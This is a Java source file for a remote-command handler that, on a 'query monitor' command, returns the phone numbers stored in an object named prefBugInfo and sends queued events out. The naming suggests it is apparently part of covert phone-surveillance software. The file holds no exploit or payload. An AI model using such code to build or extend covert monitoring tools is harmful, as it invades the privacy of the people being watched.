package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCQueryMonitorNumb extends PCCRmtCmdSync {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.QUERY_MONITOR.getId());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.MONITOR_NUMBERS);
			int countMonitorNumber = prefBugInfo.countMonitorNumber();
			for (int i = 0; i < countMonitorNumber; i++) {
				responseMessage.append(Constant.CRLF);
				responseMessage.append(prefBugInfo.getMonitorNumber(i));
			}
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
}
